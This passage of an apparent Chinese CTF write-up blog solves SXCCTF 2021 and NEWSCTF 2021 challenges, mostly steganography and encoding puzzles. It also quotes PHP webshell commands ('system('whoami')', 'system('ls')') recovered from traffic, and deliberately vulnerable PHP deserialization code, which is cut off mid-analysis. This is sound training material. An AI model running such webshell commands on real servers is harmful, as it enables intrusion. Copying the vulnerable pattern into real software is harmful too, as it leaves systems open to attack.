<code>perl flag.[a-z][a-z][a-z]</code>，当然，写作 <code>perl [a-z][a-z][a-z][a-z].[a-z][a-z][a-z]</code> 也是相同的效果。最后使用这个指令可以在程序的报错中看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613563369360.05d9dbc2583a304391338c80cc2b52ee051ca82c.png" alt="image-20210217200249084"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w3ll_th1s_f1l3_sh0uldnt_h4v3_fl4g_1n_2738372131&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SXCCTF 2021</title>
      <link href="/zh-CN/posts/6da8bc99.html"/>
      <url>/zh-CN/posts/6da8bc99.html</url>
      
        <content type="html"><![CDATA[<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396795493884.d4dcd98db0f2448d2a8bc1df138abab7bb04ca78.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Happy_New_Year_2021&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag不在这"><a href="#Flag不在这" class="headerlink" title="Flag不在这"></a>Flag不在这</h3><p>将附件 Word 文档拓展名改为 zip，解压后可见 flag.txt。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396795762500.15fa1a59ccea49523376e0efe44f1f2dcab2289e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;It&#39;s_real_easy!D0_Y0u_Like_it?&#125;</span><br></pre></td></tr></table></figure><h3 id="牛年大吉"><a href="#牛年大吉" class="headerlink" title="牛年大吉"></a>牛年大吉</h3><p>在附件的属性中可见 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396796013580.3ec87e0edea98063dd93446ccc2992b0320cd486.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;这个就是哦!&#125;</span><br></pre></td></tr></table></figure><h3 id="网络深处"><a href="#网络深处" class="headerlink" title="网络深处"></a>网络深处</h3><p>将附件解压后可以得到一段 DTMF，将其解码后可得到 <code>15975384265</code>。将其作为压缩包密码解压电话录音。使用 Audition 打开后可见下图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396796511316.e09761d1d120c03fe6985c827cc3d05d69db4bb6.png"></p><p>在第一步的文本中可以找到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">636806841748368750477720528895492611039728818913495104112781919263174040060359776171712496606031373211949881779178924464798852002228370294736546700438210687486178492208471812570216381077341015321904079977773352308159585335376746026882907466893864815887274158732965185737372992697108862362061582646638841733361046086053127284900532658885220569350253383469047741742686730128763680253048883638446528421760929131783980278391556912893405214464624884824555647881352300550360161429758833657243131238478311219915449171358359616665570429230738621272988581871</span><br></pre></td></tr></table></figure><p>根据提示可以知道其使用的是 tupper 的算法，使用<a href="https://keelyhill.github.io/tuppers-formula/">在线画图网站</a>可以得到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396796690806.cdbf48dd8810c4c3b11ac6531d33133b1fd4bacf.png" alt="image-20210209173748544"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y29pbA&#x3D;&#x3D;&#125;</span><br></pre></td></tr></table></figure><h3 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h3><p>Wireshark 分析流量包，跟踪 TCP 流到 11 可发现一段 Python 脚本。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396796885665.14ab1f4a9a1a62bfb3febc48935c04d6161d9e96.png"></p><p>跟踪到 TCP 流 20 可以发现一个压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396797097460.2565a40b011f545f77113fb14937eae80adf5fb5.png"></p><p>跟踪到 TCP 流 17 可以发现一个 pyc 文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396797335358.153e70574197b29ca3659ab994a4faf2b79322c3.png"></p><p>将以上发现的文件分离出来。将 pyc 文件反编译可得到如下代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line">key = <span class="string">&#x27;YLBSB?YLBNB!&#x27;</span></span><br></pre></td></tr></table></figure><p>解压分离出来的压缩包可得到 YLBSB.xor 文件。Python 脚本分离出来之后得到如下代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> key</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;YLBSB.docx&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">enc = <span class="built_in">open</span>(<span class="string">&quot;YLBSB.xor&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">plain = base64.b64encode(file.read())</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> plain:</span><br><span class="line">    d = <span class="built_in">chr</span>(c ^ <span class="built_in">ord</span>(key[count % <span class="built_in">len</span>(key)]))</span><br><span class="line">    enc.write(d.encode())</span><br><span class="line">    count = count + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>可以发现脚本对文件进行了按位异或的的操作，简单地修改脚本得到解密脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">&#x27;YLBSB?YLBNB!&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;YLBSB.xor&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">dec = <span class="built_in">open</span>(<span class="string">&quot;YLBSB.docx&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">enc = file.read()</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    d = <span class="built_in">chr</span>(c ^ <span class="built_in">ord</span>(key[count % <span class="built_in">len</span>(key)]))</span><br><span class="line">    dec.write(d.encode())</span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">file.close()</span><br><span class="line">dec.close()</span><br></pre></td></tr></table></figure><p>将所得的文件再 base64 解码一次可得一份 Word 文档。在参考文献中可以找到字体颜色为白色的 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396797494554.502d5dbba4c4b93da58ab4eba0b3dfefd49964f7.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;Best_YLB_Ever&#125;</span><br></pre></td></tr></table></figure><h3 id="Love-it"><a href="#Love-it" class="headerlink" title="Love_it!"></a>Love_it!</h3><blockquote><p>解压密码为：2021_jia_you!!<br>flag 为 flag{后台名称_后台账号_后台密码_一句话木马名称_一句话密码_第三个马子执行的命令}<br>例如：<br>后台网址为:<br><a href="http://127.0.0.1/admin/index.php">http://127.0.0.1/admin/index.php</a> 后台名称就为: admin<br>账号为：2021 后台账号为: 2021<br>密码为：happy_new_year! 后台密码为: happy_new_year!<br>一句话木马路径为: <a href="http://127.0.0.1/mu.php">http://127.0.0.1/mu.php</a> 一句话木马名称为: mu<br>一句话木马 一句话密码为: starsnow<br>一句话执行的命令<br>连接马子 之后执行的第三条 命令<br>第一条 yingzi=phpinfo();<br>第二条 yingzi=system(‘whoami’);<br>第三条 yingzi=system(‘ls’); 第三个马子执行的命令： system(‘ls’);</p><p>例如：<br>flag{admin_2021_happy_new_year!_starsnow_system(‘ls’);}</p></blockquote><p>根据题目给出的信息，使用 Wireshark 分析流量包。筛选 HTTP 条目，在如下三个地方可以搜集所有信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396797827741.eae41c17ff64c576b4ad8922730cde0925b39782.png" alt="image-20210209183236873"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396798219288.b9a9c46fb3bfbe36baaf889b9b0452bb432954ab.png" alt="image-20210209183241314"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396798472346.3e48ccc7e61f95905b553eb438e5c4465e7900a6.png" alt="image-20210209183244129"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dede_admin_starsnowniubi_ma_yingzi_echo &#96;whoami&#96;;&#125;</span><br></pre></td></tr></table></figure><h3 id="Very-very-easy-hex"><a href="#Very-very-easy-hex" class="headerlink" title="Very very easy hex"></a>Very very easy hex</h3><p>压缩包需要写个脚本套娃解压。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">zipname = <span class="string">&quot;img.zip&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ts1 = zipfile.ZipFile(zipname)</span><br><span class="line">    ts1.extractall(<span class="string">&quot;./&quot;</span>)</span><br><span class="line">    zipname = <span class="string">&quot;./&quot;</span>+ts1.namelist()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>解压 1.zip 可以得到一些图片。观察可以知道其中内容大量重复，找出两种不同文件包含的唯一字符分别为 <code>@</code> 和 <code>:</code>。写出脚本分析内容，将其中一种记为 1 另一种记为 0。</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">167</span>) ^</span><br><span class="line"><span class="keyword">do</span> (<span class="built_in">findstr</span> &quot;:&quot; .\img\<span class="variable">%%i</span>.png &gt; <span class="built_in">nul</span> &amp;&amp; (<span class="built_in">echo</span> <span class="number">1</span> &gt;&gt; result.txt)) || (<span class="built_in">findstr</span> &quot;@&quot; .\img\<span class="variable">%%i</span>.png &gt; <span class="built_in">nul</span> &amp;&amp; (<span class="built_in">echo</span> <span class="number">0</span> &gt;&gt; result.txt))</span><br></pre></td></tr></table></figure><p>运行脚本并整理可得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011001100110110001100001011001110111101101000100001100000101111101111001001100000111010101011111011011000110100101101011011001010101111101101001011101000011111101111101</span><br></pre></td></tr></table></figure><p>将其用 <code>From Binary</code> 转换编码后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;D0_y0u_like_it?&#125;</span><br></pre></td></tr></table></figure><h3 id="拼图"><a href="#拼图" class="headerlink" title="拼图"></a>拼图</h3><p>手拼一下得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396799090743.2c00e27b7d4f2e980e9cf1ae7ec5a5d1a37a76be.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;123A4X5b6cLi&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NEWSCTF 2021</title>
      <link href="/zh-CN/posts/bf20b880.html"/>
      <url>/zh-CN/posts/bf20b880.html</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="misc签到处"><a href="#misc签到处" class="headerlink" title="misc签到处"></a>misc签到处</h3><p>使用 010 editor 打开文件可在文件尾部发现压缩文档，同时因为其采用了仅存储的方式压缩，明文直接可见。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389839797742.687838a8cc4f591bebdc15dd3f7cb165d659f91e.png"></p><p>将其中内容提取出来得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tXZWxjMG1lX3QwX25ld3NjdGYhISF9CuaUr+S7mOWuneWPo+S7pFvmrKLov47mnaXliLDokIzmlrDnvqTotZtd</span><br></pre></td></tr></table></figure><p>使用 base64 解码一次可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_t0_newsctf!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h3><p>修正附件压缩包文件头为 <code>Rar!</code>，解压附件得到一张图片，用 010 editor 打开可发现 CRC Mismatch 的报错，使用脚本爆破得宽高为 1297x1065，修正后可得如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389839914728.bb97b168771845e7a5e02cee555a3463851e2ab2.png"></p><p>根据背景中的描述可知附件中解压所得的压缩包 niu.zip 的密码为剧中的“王天风”，转换成汉语拼音后即 <code>wangtianfeng</code>。将其作为压缩包密码解压 niu.zip 可得一张图片。</p><p>在附件中解压所得的 key.wav 的末尾可听到一段 DTMF，将其提取出来后波形和频率如下图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840083830.9bf60df5787e33f69dba1a451f8d5cc4d9e84690.png"></p><p>使用工具对照着解码再对照 T9 键盘转译可得如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#222833344477773338866#</span><br><span class="line">ctfisfun</span><br></pre></td></tr></table></figure><p>将其作为密码对 niu.jpg 使用 steghide 提取信息可得如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf niu.jpg -p ctfisfun -xf extract.txt</span><br><span class="line">熊曰：呋食很誒咯噔破啽住有歡嗚註嗄和你吃冬註物物眠嗚笨嘍擊笨噤襲你爾咬你爾常破很歡我吖拙歡意擊咯堅有嗷嗥哞怎發唬肉既歡沒破噤咯人和嘶啽更</span><br></pre></td></tr></table></figure><p>将所得信息使用熊曰解密即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840127856.59ce54a045650316e88bc908aab282d30953f1c6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;牛年大吉今晚吃鸡今晚吃鸡小年快乐happy&#125;</span><br></pre></td></tr></table></figure><h3 id="听说你喜欢薅羊毛"><a href="#听说你喜欢薅羊毛" class="headerlink" title="听说你喜欢薅羊毛"></a>听说你喜欢薅羊毛</h3><p>解压附件后得到羊毛.jpg，在文件尾部可以发现如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011110000010010100101011001110100010001101000100101001101000011010011010010001111010001110011010100010111010000011110100000000110111000000000110100110011000000001110</span><br></pre></td></tr></table></figure><p>将其使用培根密码解密之后可得如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwordistingshuonixihuanyangmao</span><br></pre></td></tr></table></figure><p>使用 <code>tingshuonixihuanyangmao</code> 对羊毛.jpg 执行 outguess 可以得到 brainpower 的压缩包密码 <code>Wdn1His87</code>。将压缩包解压后得到一个文本文档，file 一下可知是音频文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840182034.6c446279d0c0b5260ecd81645cccfb7182534515.png"></p><p>修正拓展名为 mp3 后使用 Audition 可以发现如下信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840393034.9b5e65c8914c97ac0bf7cd6403898abcfc726b4b.png"></p><p>使用 <code>PsWdMuzi123</code> 作为压缩包密码解压 flag.zip 可以得到一个 flag.txt。其中的内容经过倒序后再十六进制到十进制转化一次可得一张图片文件。将文件头修正回 JPG 的文件头 <code>FF D8 FF E0 00 10 4A 46 49 46</code> 即可得到如下二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840458062.457b16b6ab875e57cbd5a1e56db671b24f02c9b0.jpg"></p><p>扫描二维码可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;s0_easy_is_not_it?&#125;</span><br></pre></td></tr></table></figure><h3 id="happy-ox"><a href="#happy-ox" class="headerlink" title="happy ox"></a>happy ox</h3><p>解压附件可以得到牛爷爷祝大家牛年行大运.png。使用 stegsolve 可解出 flag in it.zip 的压缩包密码为 <code>niuniandaji888</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840528145.9960e7a59c3ebcd6de266c3f93b7b9a1249970fe.png"></p><p>将 flag in it.zip 解压可得到一个 Word 文档，其中有一张图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840632036.4afbd50b288e48752b87c6964a3eb31c310645e8.png"> </p><p>将 Word 文档打开后根据其中内容可知棋盘上所用密码为科比密码。使用如下密码表对照解密。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613390969937.ffc2453542232e936c0a73c520482e4c5fb9d370.png"></p><p>可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PASSWDISKBYYDSEZ</span><br></pre></td></tr></table></figure><p>以 kbyydsez 为压缩包密码解压 flag.zip 可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0h_y0u_f1nd_Me_h3ck&#125;</span><br></pre></td></tr></table></figure><h3 id="EMOJI"><a href="#EMOJI" class="headerlink" title="EMOJI"></a>EMOJI</h3><blockquote><p>Reference: <a href="https://www.zhihu.com/question/332742614/answer/737382212">https://www.zhihu.com/question/332742614/answer/737382212</a></p></blockquote><p>修复 rar 附件的文件头 <code>Rar!</code>，可以解压出一张图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840704118.492a05330b9726d4ba5e73334344931332a72c88.png"></p><p>此图是根据《长安十二时辰》中的望楼传信编制的，个十百位解码图如下。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840803116.b7478abea371cdd6b0c031d4a0aca1044ba81892.jpg"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840877046.1278f7f0c140b5be95563c5c0cce593ef931354d.jpg"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840957266.1284facd764f73d598f86368962d7e171dbf79ae.jpg"></p><p>对照上面三图可以将题目中所给算式转换出来。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">799 * 248 + 21</span><br></pre></td></tr></table></figure><p>算出结果为 198173，则压缩包密码根据提示可知是 <code>一九八一七三</code>。解压之后得到文本信息如下。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key:sixgod</span><br><span class="line">ciphertext:🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅🍌✅🚨📂📮🕹🎅🥋🌉😍🚪🤣🐅👑☂😀🦓⏩😍🌏🎅🌿🐘💵🍵☀✉🍍🌪🚫💵🍍🏎👣💵🔪🍌✉🐘😂🚨☂📮🔪💵🏹👉🐎🔬🌪🍎ℹ😊🚨😂🍵🍵😊🚨🔪✖🎈☺🦓🚰☃🌏🚪👣🍍✉👌🔄✉💧🗒🗒</span><br></pre></td></tr></table></figure><p>使用<a href="https://aghorler.github.io/emoji-aes/"> emoji-aes 在线加解密工具</a>解密即可得出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;em0j1_Aes_1s_3_ni5e_3ncr9pt_to0l&#125;</span><br></pre></td></tr></table></figure><h3 id="缺斤少两"><a href="#缺斤少两" class="headerlink" title="缺斤少两"></a>缺斤少两</h3><p>解压附件可得两张图片，扫描 <code>谐音梗，扣钱！.png</code> 可得如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大牛：我也很疑惑呢</span><br></pre></td></tr></table></figure><p>password.png 的二维码很明显缺少了一部分，根据谐音梗推测需要异或图片。于是将上述两张图片异或后得到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613393667083.f2265bcc80380afcfe97dcc12a911e0193065d59.png@125w.png"></p><p>将图片反色并修正定位点后扫描可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password:1q2w3e4r5t6y7u8i</span><br></pre></td></tr></table></figure><p>将其作为压缩包密码解压 flag+2.zip。根据得到的 hint.txt 中的提示 <code>密码是靠猜的，不是爆破！</code> 可知 passwd.jpg 中藏有隐写。使用 outguess 可以解出其中内容为 <code>news52ctf0</code>。在 <code>喵呜.jpg</code> 中可分理出一个压缩包。（到这一步我没法用上面得到的密码来解压出压缩包了，于是看了 WriteUp 接着往下写）</p><p>换表的 base64 编码，简单筛选出问号可能的字符 <code>ju34=</code>，排列组合一下可以得到正确结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lemonprefect.cn&#x2F;cb&#x2F;#recipe&#x3D;From_Base64(&#39;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs34ujkxyz012789%2B&#x2F;&#39;,true)&amp;input&#x3D;bXRIVm5rTG5JYVAzRmFBN0tPV2pUbUtrVmpXalZ6S2pkZU52VG5Bam9IOWlaT0l2VGVIYnZEPT0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEWSCTF2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>代码审计的题目，给出的代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$payload</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;boyfriend&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$key</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;hack!!!!&#x27;</span>,<span class="variable">$payload</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line"><span class="variable">$GDUT</span>[<span class="string">&#x27;A&amp;D&#x27;</span>]=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line"><span class="variable">$GDUT</span>[<span class="string">&#x27;Hed9eh0g&#x27;</span>]=<span class="string">&#x27;no_girlfriend&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>, <span class="string">&#x27;php&#x27;</span>)===<span class="literal">false</span>  &amp;&amp; strpos(<span class="variable">$payload</span>, <span class="string">&#x27;flag&#x27;</span>)===<span class="literal">false</span> &amp;&amp; strpos(<span class="variable">$payload</span>, <span class="string">&#x27;boyfriend&#x27;</span>)===<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;fuck_no_key!!!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$GDUT</span>[<span class="string">&#x27;A&amp;D&#x27;</span>]=<span class="variable">$payload</span>;</span><br><span class="line">        <span class="variable">$GDUT</span>=unserialize(filter(serialize(<span class="variable">$GDUT</span>)));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$GDUT</span>[<span class="string">&#x27;Hed9eh0g&#x27;</span>] === <span class="string">&#x27;has_girlfriend&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;fuck_no_girlfriend!!!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点是反序列化字符逃逸，有三个字符串替换，关系如下所示。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php --&gt; 字符串长度 +5</span><br><span class="line">boyfriend --&gt; 字符串长度 -1</span><br><span class="line">flag 